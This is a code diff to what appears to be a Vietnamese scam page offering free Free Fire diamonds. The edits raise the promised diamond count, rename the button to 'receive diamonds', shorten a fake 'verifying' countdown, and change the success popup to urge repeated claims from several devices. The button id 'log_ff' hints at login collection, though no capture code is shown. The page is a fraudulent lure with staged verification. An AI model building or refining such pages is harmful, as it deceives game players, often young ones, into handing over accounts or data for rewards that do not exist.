@@ -282,7 +282,7 @@
 <div class="col-sm-5">
 <form id="garena">
 <input type="radio" id="2200" value="0" name="radio-group">
-<label for="2200" <f> - Kim cương x 2,200 <img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" alt="" style="width: 20px;margin-right: 5px;"></f></label>
+<label for="2200" <f> - Kim cương x 2,750 <img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" alt="" style="width: 20px;margin-right: 5px;"></f></label>
 </form>
 </div>
 <div class="col-sm-7">
@@ -317,10 +317,10 @@ Vui lòng chọn kim cương
         $('#garena input').on('change', function() {
             var id_garena = $('input[name=radio-group]:checked', '#garena').val();
             if (id_garena === '0') {
-                var sokimcuong = '2200';
+                var sokimcuong = '2750';
                 var giatien = '0 VND';
             }
-            $("#ketqua").html('<ul class="list-group"><h4> Nhận kim cương</h4><li class="list-group-item"><div  style="float: left;width: 50%;">Số kim cương</div><div style="float: right;margin: auto;width: 50%;"><img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" alt="" style="width: 20px;margin-right: 5px;"><span>Kim Cương × ' + sokimcuong + '</span></div></li><li class="list-group-item"><div  style="float: left;width: 50%;">Người chơi</div><div style="float: right;margin: auto;width: 50%;"><span>1</span></div></li><button type="submit" id="log_ff" style="background: #ff4949;color: #fff;border-color: #ff4949;margin-top: 20px;height: 40px;font-weight: 500;" class="btn btn-default btn-block" onclick="executeExample()">XỬ LÝ THANH TOÁN</button></ul>');
+            $("#ketqua").html('<ul class="list-group"><h4> Nhận kim cương</h4><li class="list-group-item"><div  style="float: left;width: 50%;">Số kim cương</div><div style="float: right;margin: auto;width: 50%;"><img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" alt="" style="width: 20px;margin-right: 5px;"><span>Kim Cương × ' + sokimcuong + '</span></div></li><li class="list-group-item"><div  style="float: left;width: 50%;">lượt nhận mỗi ngày </div><div style="float: right;margin: auto;width: 50%;"><span>1</span></div></li><button type="submit" id="log_ff" style="background: #ff4949;color: #fff;border-color: #ff4949;margin-top: 20px;height: 40px;font-weight: 500;" class="btn btn-default btn-block" onclick="executeExample()">NHẬN KIM CƯƠNG </button></ul>');
         });
 
         function xulythanhtoan(id_sms) {
@@ -340,7 +340,7 @@ Vui lòng chọn kim cương
                 icon: 'warning',
                 title: 'Đang xác thực!',
                 html: 'Đang xác thực <b></b> milliseconds.',
-                timer: 5000,
+                timer: 1000,
                 timerProgressBar: true,
                 didOpen: () => {
                     Swal.showLoading()
@@ -355,7 +355,7 @@ Vui lòng chọn kim cương
             }).then((result) => {
                 Swal.fire(
                     'Thành Công',
-                    'Chờ 1-3 ngày Kc Sẽ Vào Acc Nếu Bạn Đã Làm Đủ,Có Thể Dùng nhiều máy Để Nhận Nhiều Hơn',
+                    'mỗi máy nhận tối đa 2 lần/ngày, hãy tận dụng để tăng khả năng đc nhận kc',
                     'success'
                 )
             })
